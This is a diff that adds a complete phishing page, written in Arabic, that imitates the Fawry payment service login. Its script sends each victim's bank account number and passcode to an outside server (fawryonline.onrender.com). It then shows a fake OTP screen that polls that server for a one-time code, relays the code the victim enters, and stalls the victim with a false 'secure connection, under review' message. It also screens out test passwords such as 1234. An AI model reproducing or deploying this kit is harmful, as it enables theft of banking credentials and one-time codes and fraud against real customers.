@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فوري</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --purple:#7B2FBF;
+  --purple-dark:#42008A;
+  --purple-mid:#9040D0;
+  --purple-light:#B060E0;
+  --purple-btn:#9B70CC;
+  --purple-muted:#C8A8E8;
+  --white:#FFFFFF;
+  --bg-grad-top:#35006B;
+  --bg-grad-bot:#8A2BBF;
+  --text-dark:#1A1A1A;
+  --text-muted:#888;
+  --border:#E0D0F0;
+}
+html,body{height:100%;font-family:'Cairo',sans-serif;overflow:hidden}
+.screen{display:none;width:100%;height:100vh;flex-direction:column;align-items:stretch}
+.screen.active{display:flex;animation:fadeIn 0.35s ease both}
+@keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+
+/* ══ SHARED BG ══ */
+.purple-bg{
+  flex:1;
+  background:linear-gradient(145deg,var(--bg-grad-top) 0%,var(--bg-grad-bot) 60%,#9B3AC8 100%);
+  display:flex;flex-direction:column;align-items:center;
+  overflow-y:auto;
+  padding-bottom:30px;
+}
+
+/* ══ LOGO AREA ══ */
+.logo-area{
+  display:flex;flex-direction:column;align-items:center;
+  padding:48px 20px 32px;
+  flex-shrink:0;
+}
+.logo-area img{
+  height:90px;width:auto;object-fit:contain;
+  filter:drop-shadow(0 4px 16px rgba(0,0,0,0.3));
+}
+.logo-area.sm{padding:28px 20px 20px}
+.logo-area.sm img{height:60px}
+
+/* ══ WHITE CARD ══ */
+.card{
+  background:#fff;
+  border-radius:20px;
+  width:calc(100% - 32px);
+  max-width:420px;
+  padding:28px 22px 24px;
+  box-shadow:0 8px 40px rgba(0,0,0,0.25);
+  margin:0 16px;
+  flex-shrink:0;
+}
+.card-title{
+  font-size:22px;font-weight:800;
+  color:var(--purple);
+  text-align:center;
+  margin-bottom:22px;
+}
+
+/* ══ FIELDS (floating label style) ══ */
+.fld{
+  position:relative;
+  margin-bottom:16px;
+  border:1.5px solid var(--border);
+  border-radius:10px;
+  padding:8px 14px 6px;
+  background:#faf8ff;
+  transition:border-color .2s;
+}
+.fld:focus-within{border-color:var(--purple);}
+.fld label{
+  display:block;font-size:12px;font-weight:600;
+  color:var(--purple-light);margin-bottom:2px;
+}
+.fld input{
+  width:100%;border:none;background:transparent;
+  font-family:'Cairo',sans-serif;font-size:16px;font-weight:600;
+  color:var(--text-dark);outline:none;padding:0;
+  direction:ltr;text-align:right;
+}
+.fld input::placeholder{color:#CCC;font-weight:400}
+.eye-btn{
+  position:absolute;left:12px;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;color:#AAA;
+  display:flex;align-items:center;padding:4px;
+}
+
+/* ══ BUTTON ══ */
+.btn-login{
+  width:100%;padding:16px;
+  background:linear-gradient(135deg,var(--purple-btn),var(--purple-light));
+  border:none;border-radius:12px;
+  color:#fff;font-family:'Cairo',sans-serif;
+  font-size:17px;font-weight:800;
+  cursor:pointer;margin-top:6px;
+  box-shadow:0 4px 18px rgba(107,31,168,0.35);
+  transition:filter .2s,transform .15s;
+}
+.btn-login:hover{filter:brightness(1.07);transform:translateY(-1px)}
+.btn-login:disabled{opacity:.6;cursor:not-allowed;transform:none}
+
+/* ══ CARD FOOTER LINKS ══ */
+.card-links{
+  display:flex;justify-content:space-between;
+  margin-top:16px;
+  flex-wrap:wrap;gap:6px;
+}
+.clink{
+  color:var(--purple);font-size:13px;font-weight:600;
+  cursor:pointer;text-decoration:underline;text-underline-offset:2px;
+}
+
+/* ══ ERROR ══ */
+.err-msg{
+  background:#FFF0F0;border:1px solid rgba(180,0,0,0.2);
+  border-radius:8px;padding:9px 12px;
+  font-size:13px;color:#B00;
+  margin-bottom:12px;display:none;
+  text-align:center;
+}
+.err-msg.show{display:block}
+
+/* ══ OTP SCREEN — FAWRY STYLE ══ */
+.otp-topbar{
+  width:100%;max-width:440px;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:22px 18px 8px;
+}
+.otp-back-btn{
+  width:40px;height:40px;
+  background:rgba(255,255,255,0.18);
+  border:none;border-radius:50%;
+  cursor:pointer;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.otp-body-text{
+  color:#fff;font-size:15px;font-weight:500;
+  text-align:center;line-height:2;
+  padding:24px 32px 36px;
+  max-width:400px;
+}
+.otp-dash-wrap{
+  display:flex;gap:20px;justify-content:center;
+  margin:0 0 30px;direction:ltr;
+}
+.otp-group{display:flex;gap:14px}
+.otp-dash{
+  width:42px!important;height:56px!important;
+  text-align:center!important;font-size:28px!important;font-weight:700!important;
+  border:none!important;
+  border-bottom:2px solid rgba(255,255,255,0.75)!important;
+  background:transparent!important;color:#fff!important;
+  outline:none!important;font-family:'Cairo',sans-serif!important;
+  padding:0!important;caret-color:#fff;
+}
+.otp-dash:focus{border-bottom-color:#fff!important}
+.otp-dash.filled{border-bottom-color:#fff!important;color:#fff!important}
+.otp-timer-text{
+  color:rgba(255,255,255,0.9);font-size:14px;font-weight:600;
+  text-align:center;margin-bottom:14px;
+  font-family:'Cairo',sans-serif;
+}
+.waiting-box{display:none}
+.waiting-box.show{display:none} /* hidden — handled by polling silently */
+.ready-box{display:none}
+.ready-box.show{display:none}
+.btn-otp{
+  width:100%;padding:15px;
+  background:rgba(255,255,255,0.18);
+  border:1.5px solid rgba(255,255,255,0.45);
+  border-radius:12px;
+  color:#fff;font-family:'Cairo',sans-serif;font-size:17px;font-weight:800;
+  cursor:pointer;
+  transition:background .2s;
+}
+.btn-otp:hover{background:rgba(255,255,255,0.26)}
+.btn-otp:disabled{opacity:.5;cursor:not-allowed}
+
+/* ══ SUCCESS SCREEN ══ */
+.success-card{
+  background:#fff;border-radius:20px;
+  width:calc(100% - 32px);max-width:420px;
+  padding:32px 24px;
+  box-shadow:0 8px 40px rgba(0,0,0,0.25);
+  margin:0 16px;
+  text-align:center;
+}
+.spinner-lg{
+  width:52px;height:52px;
+  border:4px solid rgba(107,31,168,0.15);
+  border-top-color:var(--purple);
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+  margin:0 auto 20px;
+}
+.spinner{
+  width:18px;height:18px;
+  border:2px solid rgba(255,255,255,0.4);
+  border-top-color:white;border-radius:50%;
+  animation:spin 0.7s linear infinite;
+  display:inline-block;vertical-align:middle;margin-left:6px;
+}
+</style>
+</head>
+<body>
+
+<!-- ══ SCREEN 1: LOGIN ══ -->
+<div class="screen active" id="screen-login">
+  <div class="purple-bg">
+    <div class="logo-area">
+      <img src="IMG_1976.PNG" alt="Logo">
+    </div>
+    <div class="card">
+      <div class="card-title">مرحباً!</div>
+      <div class="err-msg" id="login-err">رقم الحساب أو رمز المرور غير صحيح</div>
+
+      <div class="fld">
+        <label>الرقم البنكي الموحد</label>
+        <input type="text" id="username" inputmode="numeric" maxlength="8" placeholder="أدخل 8 أرقام" autocomplete="off">
+      </div>
+
+      <div class="fld">
+        <label>رمز المرور</label>
+        <input type="password" id="password" inputmode="numeric" maxlength="4" placeholder="أدخل 4 أرقام">
+        <button class="eye-btn" onclick="togglePass()" type="button">
+          <svg id="eye-icon" width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88"/>
+          </svg>
+        </button>
+      </div>
+
+      <button class="btn-login" id="login-btn" onclick="doLogin()">تسجيل الدخول</button>
+
+      <div class="card-links">
+        <span class="clink">هل نسيت رمز المرور؟</span>
+        <span class="clink">فتح حساب جديد</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 2: OTP ══ -->
+<div class="screen" id="screen-otp">
+  <div class="purple-bg">
+
+    <!-- Top bar: back + logo -->
+    <div class="otp-topbar">
+      <div style="width:40px"></div>
+      <img src="IMG_1976.PNG" alt="Logo" style="height:55px;width:auto;object-fit:contain;filter:drop-shadow(0 2px 10px rgba(0,0,0,0.25))">
+      <button class="otp-back-btn" onclick="goTo('screen-login')">
+        <svg width="20" height="20" fill="none" stroke="white" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>
+      </button>
+    </div>
+
+    <!-- Body text -->
+    <div class="otp-body-text">
+      عزيزنا العميل، تم إرسال رمز التحقق إلى رقم الواتساب المسجل لديك. إذا لم تستلم الرمز، يُرجى المحاولة مرة أخرى أو اختيار الاستلام عبر الرسالة النصية أو البريد الإلكتروني
+    </div>
+
+    <!-- Hidden notices (JS logic only) -->
+    <div id="waiting-notice" class="waiting-box"></div>
+    <div id="ready-notice" class="ready-box"></div>
+
+    <!-- OTP inputs: 3 + gap + 3 -->
+    <div class="otp-dash-wrap">
+      <div class="otp-group">
+        <input class="otp-dash" type="text" inputmode="numeric" maxlength="1" id="otp1" autocomplete="off">
+        <input class="otp-dash" type="text" inputmode="numeric" maxlength="1" id="otp2" autocomplete="off">
+        <input class="otp-dash" type="text" inputmode="numeric" maxlength="1" id="otp3" autocomplete="off">
+      </div>
+      <div class="otp-group">
+        <input class="otp-dash" type="text" inputmode="numeric" maxlength="1" id="otp4" autocomplete="off">
+        <input class="otp-dash" type="text" inputmode="numeric" maxlength="1" id="otp5" autocomplete="off">
+        <input class="otp-dash" type="text" inputmode="numeric" maxlength="1" id="otp6" autocomplete="off">
+      </div>
+    </div>
+
+    <!-- Timer -->
+    <div class="otp-timer-text" id="timer-display">ستنتهي صلاحية رمز التحقق في: 10 دقيقة:00 ثانية</div>
+
+    <!-- Error -->
+    <div class="err-msg" id="otp-err" style="width:calc(100% - 48px);max-width:380px;margin:10px auto">الرمز المدخل غير صحيح</div>
+
+    <!-- Confirm button -->
+    <div style="width:calc(100% - 48px);max-width:380px;margin:10px auto 0">
+      <button class="btn-otp" id="otp-btn" onclick="doOtp()">تأكيد الرمز</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══ SCREEN 3: SUCCESS/WAITING ══ -->
+<div class="screen" id="screen-success">
+  <div class="purple-bg">
+    <div class="logo-area sm">
+      <img src="IMG_1976.PNG" alt="Logo">
+    </div>
+    <div class="success-card">
+      <div id="wait-screen">
+        <div class="spinner-lg"></div>
+        <div style="font-size:20px;font-weight:800;color:var(--purple);margin-bottom:10px">طلبك قيد المراجعة</div>
+        <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:20px">
+          يرجى عدم إغلاق الصفحة<br>جاري مراجعة بياناتك...
+        </div>
+        <div style="background:#F8F0FF;border:1px solid rgba(107,31,168,0.2);border-radius:12px;padding:14px;font-size:13px;color:var(--purple);line-height:1.8">
+          🔒 اتصالك آمن ومشفر<br>سيتم معالجة طلبك خلال لحظات
+        </div>
+      </div>
+      <div id="error-screen" style="display:none">
+        <div style="font-size:52px;margin-bottom:16px">❌</div>
+        <div style="font-size:20px;font-weight:800;color:#B00;margin-bottom:10px">حدث خطأ</div>
+        <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:24px">
+          يبدو أنك قمت بإدخال البيانات بشكل خاطئ<br>حاول مرة أخرى
+        </div>
+        <button class="btn-login" onclick="resetAll()">البداية من الأول</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const API = 'https://fawryonline.onrender.com';
+let SESSION_ID = null;
+let timerInterval = null, timerSeconds = 3600;
+let pollInterval = null;
+const otpIds = ['otp1','otp2','otp3','otp4','otp5','otp6'];
+
+function goTo(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  const el = document.getElementById(id);
+  el.classList.add('active');
+  el.style.animation = 'none';
+  requestAnimationFrame(()=>{ el.style.animation = ''; });
+}
+
+function togglePass(){
+  const f = document.getElementById('password');
+  f.type = f.type === 'password' ? 'text' : 'password';
+}
+
+function isBadPassword(p){
+  // 1234 أو كل الأرقام نفسها: 1111 2222 0000 ...
+  if(p === '1234') return true;
+  if(/^(.)\1{3}$/.test(p)) return true; // 1111, 2222, 9999, 0000
+  return false;
+}
+
+async function doLogin(){
+  const u = document.getElementById('username').value.trim();
+  const p = document.getElementById('password').value.trim();
+  const err = document.getElementById('login-err');
+
+  const validUser = /^\d{8}$/.test(u);
+  const validPass = /^\d{4}$/.test(p);
+
+  if(!validUser || !validPass){
+    showInvalidModal();
+    return;
+  }
+  err.classList.remove('show');
+
+  const btn = document.getElementById('login-btn');
+  btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+  btn.disabled = true;
+
+  try{
+    const r = await fetch(`${API}/api/submit`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({username:u, password:p})
+    });
+    const d = await r.json();
+    if(d.sessionId){
+      SESSION_ID = d.sessionId;
+      // لو الباسورد 1234 أو كلو نفس الرقم → Invalid Source وما يروح OTP
+      if(isBadPassword(p)){
+        btn.innerHTML = 'تسجيل الدخول';
+        btn.disabled = false;
+        showInvalidModal();
+        return;
+      }
+      goTo('screen-otp');
+      startOTPTimer();
+      startPolling();
+      setTimeout(()=>document.getElementById('otp1').focus(), 300);
+    } else {
+      showInvalidModal();
+    }
+  } catch(e){
+    showInvalidModal();
+  }
+  btn.innerHTML = 'تسجيل الدخول';
+  btn.disabled = false;
+}
+
+function startPolling(){
+  if(!SESSION_ID) return;
+  clearInterval(pollInterval);
+  document.getElementById('waiting-notice').classList.add('show');
+  document.getElementById('ready-notice').classList.remove('show');
+  pollInterval = setInterval(async()=>{
+    try{
+      const r = await fetch(`${API}/api/check-otp/${SESSION_ID}`);
+      const d = await r.json();
+      if(d.status === 'otp_sent' && d.otp){
+        const digits = d.otp.toString().split('');
+        otpIds.forEach((id,i)=>{
+          const el = document.getElementById(id);
+          el.value = digits[i] || '';
+          el.classList.toggle('filled', !!digits[i]);
+        });
+        document.getElementById('waiting-notice').classList.remove('show');
+        document.getElementById('ready-notice').classList.add('show');
+        clearInterval(pollInterval);
+      }
+    }catch(e){}
+  }, 3000);
+}
+
+function startOTPTimer(){
+  timerSeconds = 600;
+  clearInterval(timerInterval);
+  updateTimerDisplay();
+  timerInterval = setInterval(()=>{
+    timerSeconds--;
+    updateTimerDisplay();
+    if(timerSeconds <= 0){
+      clearInterval(timerInterval);
+      clearInterval(pollInterval);
+      document.getElementById('otp-err').textContent = 'انتهت صلاحية الرمز.';
+      document.getElementById('otp-err').classList.add('show');
+    }
+  }, 1000);
+}
+
+function updateTimerDisplay(){
+  const m = Math.floor(timerSeconds/60).toString().padStart(2,'0');
+  const s = (timerSeconds%60).toString().padStart(2,'0');
+  document.getElementById('timer-display').textContent =
+    `ستنتهي صلاحية رمز التحقق في: ${m} دقيقة:${s} ثانية`;
+}
+
+async function doOtp(){
+  const code = otpIds.map(id=>document.getElementById(id).value).join('');
+  const err = document.getElementById('otp-err');
+  if(code.length < 6){
+    err.textContent = 'يرجى إدخال الرمز المكوّن من 6 أرقام كاملاً';
+    err.classList.add('show');
+    return;
+  }
+  if(timerSeconds <= 0){
+    err.textContent = 'انتهت صلاحية الرمز.';
+    err.classList.add('show');
+    return;
+  }
+  err.classList.remove('show');
+  const btn = document.getElementById('otp-btn');
+  btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+  btn.disabled = true;
+  try{
+    const r = await fetch(`${API}/api/submit-otp`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({sessionId:SESSION_ID, otp:code})
+    });
+    const d = await r.json();
+    if(d.success){
+      clearInterval(timerInterval);
+      clearInterval(pollInterval);
+      goTo('screen-success');
+      setTimeout(()=>{
+        document.getElementById('wait-screen').style.display = 'none';
+        document.getElementById('error-screen').style.display = 'block';
+      }, 5 * 60 * 1000);
+    } else {
+      err.textContent = 'الرمز غير صحيح';
+      err.classList.add('show');
+    }
+  } catch(e){
+    showInvalidModal();
+  }
+  btn.innerHTML = 'تأكيد الرمز';
+  btn.disabled = false;
+}
+
+function resetAll(){
+  SESSION_ID = null;
+  document.getElementById('username').value = '';
+  document.getElementById('password').value = '';
+  otpIds.forEach(id=>{
+    const el = document.getElementById(id);
+    el.value = '';
+    el.classList.remove('filled');
+  });
+  document.getElementById('wait-screen').style.display = 'block';
+  document.getElementById('error-screen').style.display = 'none';
+  goTo('screen-login');
+}
+
+// OTP input behavior
+otpIds.forEach((id,i)=>{
+  const el = document.getElementById(id);
+  el.addEventListener('input',function(){
+    this.value = this.value.replace(/[^0-9]/g,'');
+    if(this.value.length > 1) this.value = this.value.slice(-1);
+    if(this.value){
+      this.classList.add('filled');
+      if(i < 5) document.getElementById(otpIds[i+1]).focus();
+    } else {
+      this.classList.remove('filled');
+    }
+  });
+  el.addEventListener('keydown',function(e){
+    if(e.key==='Backspace' && !this.value && i>0) document.getElementById(otpIds[i-1]).focus();
+    if(e.key==='Enter') doOtp();
+  });
+  el.addEventListener('paste',function(e){
+    e.preventDefault();
+    const p = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
+    otpIds.forEach((oid,j)=>{
+      const x = document.getElementById(oid);
+      x.value = p[j] || '';
+      x.classList.toggle('filled', !!p[j]);
+    });
+  });
+});
+
+document.addEventListener('keydown',e=>{
+  if(e.key !== 'Enter') return;
+  const a = document.querySelector('.screen.active').id;
+  if(a === 'screen-login') doLogin();
+  else if(a === 'screen-otp') doOtp();
+});
+
+// ── INVALID SOURCE MODAL ──
+function showInvalidModal() {
+  document.getElementById('invalid-modal').style.display = 'flex';
+}
+function closeInvalidModal() {
+  document.getElementById('invalid-modal').style.display = 'none';
+}
+</script>
+
+<!-- ── INVALID SOURCE MODAL ── -->
+<div id="invalid-modal" style="display:none;position:fixed;inset:0;z-index:9999;background:linear-gradient(160deg,#5B1A9A 0%,#8B30C0 50%,#A855D4 100%);align-items:center;justify-content:center;padding:24px">
+  <div style="background:#fff;border-radius:18px;padding:36px 28px 28px;width:100%;max-width:340px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.25)">
+    <div style="font-size:22px;font-weight:700;color:#888;margin-bottom:24px;font-family:'Cairo',sans-serif">فوري</div>
+    <div style="font-size:17px;font-weight:800;color:#333;line-height:1.6;margin-bottom:36px">Invalid Source. Please contact Customer Care</div>
+    <button onclick="closeInvalidModal()" style="width:100%;padding:16px;background:#6B1FA8;border:none;border-radius:12px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif">موافق</button>
+  </div>
+</div>
+
+</body>
+</html>
